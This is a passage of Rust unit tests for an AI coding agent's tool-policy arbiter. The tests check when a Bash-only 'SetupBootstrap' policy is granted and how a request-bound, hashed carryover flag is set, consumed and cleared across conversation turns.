    // — SetupBootstrap candidate is NOT installed.
    let candidates_before = build_arbiter_candidates_for_test(&agent);
    let setup_bootstrap_before = candidates_before
        .iter()
        .any(|c| c.get("kind").and_then(|v| v.as_str()) == Some("SetupBootstrap"));
    assert!(
        !setup_bootstrap_before,
        "Stage A=false + Stage B=label-only must NOT install SetupBootstrap \
         (false-positive suppression regression)"
    );

    // Now seed the Stage A live observation flag — production code sets
    // this in `run_task_contract_verifier_once::OwnedTestVerifierPlan::Missing`.
    seed_owned_test_verifier_missing_for_test(&mut agent, true);

    // SetupBootstrap candidate is installed via Stage A live (step 2 of
    // `should_install_setup_bootstrap`).
    let candidates_after = build_arbiter_candidates_for_test(&agent);
    let setup_bootstrap_after = candidates_after
        .iter()
        .any(|c| c.get("kind").and_then(|v| v.as_str()) == Some("SetupBootstrap"));
    assert!(
        setup_bootstrap_after,
        "Stage A live observation must install SetupBootstrap candidate"
    );

    // Project the effective policy: SetupBootstrap selected → ["Bash"]
    // allowed only, reason = "setup_bootstrap" (DS1-001 二段防衛).
    let (allowed_tool_names, reason_label) = effective_tool_policy_for_test(&agent);
    assert_eq!(reason_label, "setup_bootstrap");
    assert_eq!(allowed_tool_names, vec!["Bash".to_string()]);
}

#[test]
fn setup_bootstrap_does_not_overfire_on_plain_add_test_request() {
    let session_id = unique_session_id("plain-add-tests");
    let server = mockito::Server::new();
    let (mut agent, _dir) = build_live_agent(&session_id, &server.url());

    // Plain "add tests" request: required_artifacts has only Test (not
    // Setup), behavior projection has confidence 1.0 with the derived
    // `verification_expectations = ["test"]` label. Stage A is *not*
    // observed (the per-turn flag stays false — production code only
    // sets it inside `run_task_contract_verifier_once` after a real
    // verifier run, which is not exercised here).
    agent
        .session
        .working_memory
        .set_active_task(Some("Add tests for module X".to_string()));

    // CB-001 false-positive suppression: with Stage A=false and the
    // projection only carrying a verifier-capability label (no Setup
    // keyword), `should_install_setup_bootstrap` must return false at
    // step (2) — the label-only Stage B is corroborated only at step
    // (4) via `behavior_projection_has_setup_label`, which checks the shared
    // setup token table — none of which match "test".
    let candidates = build_arbiter_candidates_for_test(&agent);
    let setup_bootstrap_present = candidates
        .iter()
        .any(|c| c.get("kind").and_then(|v| v.as_str()) == Some("SetupBootstrap"));
    assert!(
        !setup_bootstrap_present,
        "plain 'Add tests' request without Stage A observation must NOT install SetupBootstrap (CB-001 regression)"
    );

    // The projected effective policy is `unrestricted` (no SetupBootstrap
    // candidate selected).
    let (allowed_tool_names, reason_label) = effective_tool_policy_for_test(&agent);
    assert!(
        allowed_tool_names.is_empty(),
        "no active job → unrestricted policy (empty allow list)"
    );
    assert_eq!(reason_label, "unrestricted");

    // Defensive double-check: ensure the per-turn flag is indeed false
    // (the test fixture didn't accidentally drift the state).
    assert!(
        !agent.owned_test_verifier_missing_observed_this_turn,
        "fresh agent must have Stage A flag unset"
    );
}

// ---------------------------------------------------------------------------
// Issue #664 iteration-3 (CB2-001): cross-turn carryover lifecycle.
//
// The iteration-2 Stage A flag was reset at every `run_actor_loop` head,
// but the only production setter (`OwnedTestVerifierPlan::Missing` arm)
// immediately returns `SafeStop`. Therefore the actor loop never reached
// a subsequent `build_arbiter_candidates` cycle that could consume the
// signal — by the time the next user message arrives, the flag is
// already false again. The iteration-3 fix introduces a cross-turn
// carryover field that is set alongside `_this_turn` on the Missing
// arm; the next `run_actor_loop` head promotes the carryover into
// `_this_turn` and clears the carryover. The promotion is idempotent
// (clears in one cycle), so a SafeStop never accumulates the flag.
// ---------------------------------------------------------------------------

#[test]
fn setup_bootstrap_stage_a_consumed_in_next_turn_after_safe_stop() {
    let session_id = unique_session_id("cb2-001-carryover");
    let server = mockito::Server::new();
    let (mut agent, _dir) = build_live_agent(&session_id, &server.url());

    // Seed the active task so the projection has a verifier-capability
    // label (Stage B) — required for `should_install_setup_bootstrap`
    // step (2) to install a SetupBootstrap candidate once Stage A is
    // observed (Stage A live signal alone is sufficient via the OR
    // composition in `VerifierPrerequisiteSignal`, but Stage B keeps
    // the test honest about the projection's role).
    let originating_request = "Add tests for module X";
    agent
        .session
        .working_memory
        .set_active_task(Some(originating_request.to_string()));

    // Step 1 — Simulate turn N where the verifier observes
    // `OwnedTestVerifierPlan::Missing`. Production code sets BOTH
    // flags atomically inside the Missing arm before returning
    // `SafeStop`. The test seam drives the carryover directly,
    // binding it to the originating request text (CB3-001).
    seed_owned_test_verifier_missing_for_test(&mut agent, true);
    seed_owned_test_verifier_missing_carryover_for_test(&mut agent, Some(originating_request));

    // Step 2 — Simulate the turn boundary. Production code does NOT
    // touch the carryover between turns; only the user-message-head
    // consume step does. To prove the carryover survives, we clear
    // `_this_turn` only (mimicking what would happen if the actor
    // loop did NOT consume the carryover).
    seed_owned_test_verifier_missing_for_test(&mut agent, false);
    let (live, carryover) = owned_test_verifier_missing_flags_for_test(&agent);
    assert!(!live, "fixture: _this_turn cleared between turns");
    assert!(
        carryover,
        "carryover MUST survive across the turn boundary (CB2-001)"
    );

    // Step 3 — Simulate the next user-message turn entering
    // `run_actor_loop` with the SAME originating request. The head
    // of `run_actor_loop` consumes the carryover, promotes it into
    // `_this_turn`, and clears the carryover (CB3-001: equality on
    // the request key).
    consume_carryover_at_actor_loop_head_for_test(&mut agent, Some(originating_request));
    let (live, carryover) = owned_test_verifier_missing_flags_for_test(&agent);
    assert!(
        live,
        "carryover MUST promote into `_this_turn` at run_actor_loop head (CB2-001)"
    );
    assert!(
        !carryover,
        "carryover MUST clear after consumption (idempotent / single-use)"
    );

    // Step 4 — Now `build_arbiter_candidates` runs in the next turn
    // and observes `_this_turn = true`, which trips the
    // `VerifierPrerequisiteSignal::from_sources(true, _)` Stage A
    // path. `should_install_setup_bootstrap` returns true at step
    // (2) (verifier prerequisite signal active), and a
    // SetupBootstrap candidate is installed.
    let candidates = build_arbiter_candidates_for_test(&agent);
    let has_setup_bootstrap = candidates
        .iter()
        .any(|c| c.get("kind").and_then(|v| v.as_str()) == Some("SetupBootstrap"));
    assert!(
        has_setup_bootstrap,
        "SetupBootstrap candidate MUST be installed in the next turn after carryover consumption (CB2-001 lifecycle fix)"
    );

    // The projected effective policy is `setup_bootstrap` with `Bash` only.
    let (allowed_tool_names, reason_label) = effective_tool_policy_for_test(&agent);
    assert_eq!(reason_label, "setup_bootstrap");
    assert_eq!(allowed_tool_names, vec!["Bash".to_string()]);
}

#[test]
fn carryover_does_not_accumulate_across_multiple_safe_stop_cycles() {
    // Carryover consume is single-shot: a single
    // `consume_carryover_at_actor_loop_head_for_test` clears the
    // carryover, so a subsequent turn with no fresh observation does
    // NOT keep installing SetupBootstrap candidates. This pins the
    // idempotent-consume invariant against accidental "sticky" Stage A.
    let session_id = unique_session_id("cb2-001-no-accumulate");
    let server = mockito::Server::new();
    let (mut agent, _dir) = build_live_agent(&session_id, &server.url());

    let originating_request = "Add tests for module X";
    agent
        .session
        .working_memory
        .set_active_task(Some(originating_request.to_string()));

    seed_owned_test_verifier_missing_carryover_for_test(&mut agent, Some(originating_request));

    // First post-SafeStop turn: carryover → _this_turn (same request).
    consume_carryover_at_actor_loop_head_for_test(&mut agent, Some(originating_request));
    let (live_after_first, carryover_after_first) =
        owned_test_verifier_missing_flags_for_test(&agent);
    assert!(live_after_first);
    assert!(!carryover_after_first);

    // Reset _this_turn to false to simulate next turn's head reset
    // (the carryover field is already cleared so the second consume
    // is a no-op).
    seed_owned_test_verifier_missing_for_test(&mut agent, false);
    consume_carryover_at_actor_loop_head_for_test(&mut agent, Some(originating_request));
    let (live_after_second, carryover_after_second) =
        owned_test_verifier_missing_flags_for_test(&agent);
    assert!(
        !live_after_second,
        "second consume on a cleared carryover must NOT re-set _this_turn (CB2-001 single-shot invariant)"
    );
    assert!(!carryover_after_second);
}

// ---------------------------------------------------------------------------
// Issue #664 iteration-4 (CB3-001): request-bound Stage A carryover.
//
// The iteration-3 carryover was a plain `bool`, which let a `Missing`-
// verifier SafeStop signal grant the Bash-only `setup_bootstrap` policy
// to ANY high-confidence request on the next turn — including unrelated
// follow-ups where the user has switched topic. Iteration-4 replaces the
// boolean with a `RequestCarryoverKey` (16-hex digest of
// `mask_secrets(originating_request_text)`), and the actor-loop head
// promotes the carryover into `_this_turn` only when the current
// request hashes to the same key.
//
// Security Invariants verified by these tests:
// - Equality-promotion only on identical originating request (positive case).
// - Topic switch (different request text) clears the carryover without
//   promotion AND prevents stale-Stage-A SetupBootstrap install (negative).
// - Raw request text never appears inside the carryover field (mask /
//   hash defence-in-depth audit trail).
// ---------------------------------------------------------------------------

#[test]
fn setup_bootstrap_stage_a_carryover_consumed_when_request_unchanged() {
    // CB3-001 positive case: when the next turn's request equals the
    // originating request that produced the Missing-verifier SafeStop,
    // the carryover promotes into `_this_turn` and the SetupBootstrap
    // candidate is installed.
    let session_id = unique_session_id("cb3-001-same-request");
    let server = mockito::Server::new();
    let (mut agent, _dir) = build_live_agent(&session_id, &server.url());

    // Originating verifier-failure context: an "add tests" request.
    let originating_request = "Add tests for module X";
    agent
        .session
        .working_memory
        .set_active_task(Some(originating_request.to_string()));

    // Simulate the previous turn's Missing arm setting the carryover
    // bound to that request.
    seed_owned_test_verifier_missing_carryover_for_test(&mut agent, Some(originating_request));

    // Next turn arrives with the SAME request text — the user is
    // continuing the same task. The consumer promotes the carryover.
    consume_carryover_at_actor_loop_head_for_test(&mut agent, Some(originating_request));
    let (live, carryover) = owned_test_verifier_missing_flags_for_test(&agent);
    assert!(
        live,
        "Stage A MUST promote when the originating request still drives this turn (CB3-001)"
    );
    assert!(!carryover, "carryover MUST clear after single-use consume");

    // Arbiter installs SetupBootstrap (Stage A live path).
    let candidates = build_arbiter_candidates_for_test(&agent);
    assert!(
        candidates
            .iter()
            .any(|c| c.get("kind").and_then(|v| v.as_str()) == Some("SetupBootstrap")),
        "SetupBootstrap candidate MUST be installed when carryover request matches (CB3-001)"
    );
    let (allowed, reason_label) = effective_tool_policy_for_test(&agent);
    assert_eq!(reason_label, "setup_bootstrap");
    assert_eq!(allowed, vec!["Bash".to_string()]);
}

#[test]
fn setup_bootstrap_stage_a_carryover_cleared_on_unrelated_request() {
    // CB3-001 negative case (security-critical): when the user switches
    // topic between the Missing-verifier SafeStop and the next turn,
    // the stored carryover MUST NOT promote into `_this_turn` — even
    // though the next request has a high-confidence verifier-capability
    // label projection that would otherwise unlock SetupBootstrap via
    // Stage A. The carryover is cleared without promotion.
    let session_id = unique_session_id("cb3-001-topic-switch");
    let server = mockito::Server::new();
    let (mut agent, _dir) = build_live_agent(&session_id, &server.url());

    // Originating verifier-failure context: an "add tests" request.
    let originating_request = "Add tests for module X";
    // User switches topic on the next turn — completely unrelated task.
    let unrelated_request = "Refactor the markdown renderer for color output";

    // Seed the active task to the UNRELATED request (this is what the
    // next turn's `active_request_text()` will return).
    agent
        .session
        .working_memory
        .set_active_task(Some(unrelated_request.to_string()));

    // Carryover stored from the previous Missing arm bound to the
    // ORIGINATING request.
    seed_owned_test_verifier_missing_carryover_for_test(&mut agent, Some(originating_request));

    // Next turn arrives with the UNRELATED request text. The consumer
    // computes the current key, sees it does NOT equal the stored
    // key, and clears the carryover without promotion.
    consume_carryover_at_actor_loop_head_for_test(&mut agent, Some(unrelated_request));
    let (live, carryover) = owned_test_verifier_missing_flags_for_test(&agent);
    assert!(
        !live,
        "Stage A MUST NOT promote on unrelated request (CB3-001 topic-switch guard)"
    );
    assert!(
        !carryover,
        "carryover MUST clear after topic-switch consume (single-shot)"
    );

    // The arbiter MUST NOT install SetupBootstrap for the unrelated
    // request. Even though the projection for this request might have
    // a verifier-capability label (Stage B), the iteration-2 CB-001
    // suppression keeps Stage-B-alone from installing SetupBootstrap.
    let candidates = build_arbiter_candidates_for_test(&agent);
    assert!(
        !candidates
            .iter()
            .any(|c| c.get("kind").and_then(|v| v.as_str()) == Some("SetupBootstrap")),
        "SetupBootstrap MUST NOT be installed on an unrelated follow-up request (CB3-001)"
    );

    // Effective policy degrades to unrestricted, NOT the Bash-only
    // `setup_bootstrap` — the false-positive grant is closed.
    let (allowed, reason_label) = effective_tool_policy_for_test(&agent);
    assert_eq!(reason_label, "unrestricted");
    assert!(
        allowed.is_empty(),
        "no SetupBootstrap selection → unrestricted (empty allow list)"
    );
}

#[test]
fn request_carryover_key_uses_mask_secrets_and_stable_path_hash() {
    // CB3-001 audit: prove the carryover field never stores the raw
    // request text directly. The seam constructs the key via
    // `RequestCarryoverKey::from_request`, which pipes through
    // `mask_secrets` + `stable_path_hash` (16-hex digest). The
    // `carryover_key_raw_text_not_stored_for_test` seam asserts the
    // digest does NOT contain the raw needle text — i.e. the key was
    // actually hashed (digest output differs from any meaningful raw
    // substring of the input).
    use super::carryover_key_raw_text_not_stored_for_test;

    let session_id = unique_session_id("cb3-001-mask-hash");
    let server = mockito::Server::new();
    let (mut agent, _dir) = build_live_agent(&session_id, &server.url());

    // Request text that includes a recognizable distinctive substring
    // so the absence-check on the digest is meaningful (the substring
    // is unlikely to appear by collision in any 16-hex DefaultHasher
    // output — and even if it did, the test seam's hash is the same
    // SSOT as production).
    let request_with_distinctive_token =
        "Add tests for DISTINCTIVE_NEEDLE_TOKEN_zX9 in module helper.rs";
    let distinctive_needle = "DISTINCTIVE_NEEDLE_TOKEN_zX9";

    seed_owned_test_verifier_missing_carryover_for_test(
        &mut agent,
        Some(request_with_distinctive_token),
    );

    // Audit: the carryover is present but the raw distinctive token
    // is NOT inside the stored digest (hash output is 16 lowercase
    // hex chars, the distinctive token contains uppercase letters
    // and underscore; the hash cannot literally contain it).
    let (_live, carryover_present) = owned_test_verifier_missing_flags_for_test(&agent);
    assert!(
        carryover_present,
        "fixture: carryover MUST be set so the audit is meaningful"
    );
    assert!(
        carryover_key_raw_text_not_stored_for_test(&agent, distinctive_needle),
        "raw request text MUST NOT appear inside the carryover digest (mask_secrets + stable_path_hash defence)"
    );

    // Additional sanity: the carryover MUST also not match the entire
    // raw request text — a fortiori, hashing produces a digest, not
    // a copy.
    assert!(
        carryover_key_raw_text_not_stored_for_test(&agent, request_with_distinctive_token),
        "raw request text (full string) MUST NOT appear inside the carryover digest"
    );

    // Equality of two keys built from the same text proves the key
    // is deterministic + symmetric (request-binding equality).
    let key_a = super::task_contract::RequestCarryoverKey::from_request("foo bar");
    let key_b = super::task_contract::RequestCarryoverKey::from_request("foo bar");
    let key_c = super::task_contract::RequestCarryoverKey::from_request("baz qux");
    assert_eq!(
        key_a, key_b,
        "RequestCarryoverKey MUST be deterministic across calls (Eq invariant)"
    );
    assert_ne!(
        key_a, key_c,
        "Different inputs MUST yield different keys (collision-resistant correlator)"
    );

    // The digest is 16 lowercase hex chars (matching the
    // `stable_path_hash` SSOT shape).
    let hash = key_a.originating_request_hash_for_test();
    assert_eq!(
        hash.len(),
        16,
        "digest length MUST match stable_path_hash 16-hex SSOT"
    );
    assert!(
        hash.chars()
            .all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase()),
        "digest MUST be lowercase ASCII hex"
    );
}
